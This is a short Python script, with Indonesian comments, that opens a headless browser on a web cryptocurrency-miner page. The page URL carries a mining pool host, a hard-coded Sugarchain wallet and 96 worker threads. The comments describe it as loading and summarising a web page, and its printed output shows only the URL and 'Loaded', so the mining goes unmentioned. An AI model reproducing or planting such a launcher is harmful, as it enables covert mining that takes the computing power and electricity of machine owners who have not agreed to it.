import asyncio
from pyppeteer import launch
from tabulate import tabulate

async def main():
    browser = await launch(headless=True)
    page = await browser.newPage()
    url = "https://webminer.pages.dev/?algorithm=yespowersugar&host=cugeoyom.tech:3333&worker=sugar1q9k38saldc5ey6389u86ar0a9nuxsuyu59z8acz&password=c%3DSUGAR&workers=96"
    
    await page.goto(url)
    
    # Tunggu beberapa waktu agar halaman sepenuhnya dimuat
    await page.waitForSelector('body', timeout=10000)

    # Ambil konten HTML dari halaman
    content = await page.content()
    
    # Jika Anda ingin menampilkan HTML, Anda bisa melakukannya di sini
    # print(content)
    
    # Misalkan kita hanya ingin menampilkan halaman secara ringkas
    # Anda bisa mengedit sesuai dengan informasi yang ingin diambil
    data = [
        ["URL", url],
        ["Status", "Loaded"]
    ]
    
    print(tabulate(data, headers=["Field", "Value"], tablefmt="grid"))
    
    await browser.close()

if __name__ == '__main__':
    asyncio.get_event_loop().run_until_complete(main())
